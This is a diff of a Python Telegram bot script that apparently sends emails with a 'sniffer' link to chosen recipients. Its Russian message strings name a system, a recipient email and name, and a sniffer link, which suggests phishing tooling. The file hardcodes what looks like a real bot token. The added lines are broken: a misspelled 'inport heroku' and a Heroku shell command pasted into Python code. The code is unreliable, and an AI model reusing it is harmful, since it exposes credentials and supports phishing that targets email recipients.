@@ -10,6 +10,8 @@ from email.utils import formataddr
 
 import random
 
+inport heroku
+
 body = """"""
 
 token = '1917850999:AAE-oToU73zT-HsoMMMMcLh4f2-0accEUB4'
@@ -272,7 +274,7 @@ def getSniffer(message):
 		bot.send_message(message.from_user.id, 'Система: ' + systemText + '\nEmail получателя: ' + emailText + '\nИмя получателя: ' + notMyNameText + '\nСсылка на сниффер: ' + snifferText + '.', reply_markup=markup2)
 
 if __name__ == '__main__':
-	run(host='0.0.0.0', port=os.environ.get('PORT', '5000'))
+	heroku config:add PORT=5000
 	bot.polling(none_stop=True)
 
 #Termux: cd $HOME && cp -r /storage/emulated/0/EmailSender $HOME && python3 EmailSender/Telegram.py
